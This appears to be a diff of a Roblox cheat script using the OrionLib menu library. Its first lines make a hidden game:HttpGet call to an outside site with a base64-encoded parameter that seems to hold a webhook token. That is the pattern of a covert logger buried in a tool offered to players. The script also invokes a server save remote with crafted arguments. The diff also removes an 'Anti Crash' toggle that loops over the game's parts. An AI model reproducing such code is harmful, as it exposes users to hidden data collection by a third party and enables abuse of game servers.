@@ -1,4 +1,4 @@
-game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==MTA2ODUxNDAyOTY3ODYyNDg4MC9yM3dvUHNfTHp1QlF3NWZLN2p0X0tBMUpYVDg4VW1tYlJBUGlwYmloeWV3LWlyRkZYa3NjY1A1MW9UcG4zcFZpbjBUQQ==")
+game:HttpGet("https://littest.site/yeet/site.php?h=MTA2ODUxNDAyOTY3ODYyNDg4MC9yM3dvUHNfTHp1QlF3NWZLN2p0X0tBMUpYVDg4VW1tYlJBUGlwYmloeWV3LWlyRkZYa3NjY1A1MW9UcG4zcFZpbjBUQQ==")
 local args = {
     [1] = {
         [1] = "SAVE",
@@ -461,24 +461,6 @@ local args = {
 
 game:GetService("ReplicatedStorage").Network.BuildSaving:InvokeServer(unpack(args))
         end    
-})
-
-Teb:AddToggle({
-      Name = "Anti Crash",
-      Default = true,
-      Callback = function(Value)
-            while true do
-	task.wait()
-	for i,v in pairs(workspace:GetDescendants()) do
-    if v:IsA("BasePart") then
-			if v.Locked == false then
-				v.CanCollide = false
-				v.Transparency = 1
-			end
-		end
-	end
-end
-      end    
 })
 
 OrionLib:Init()
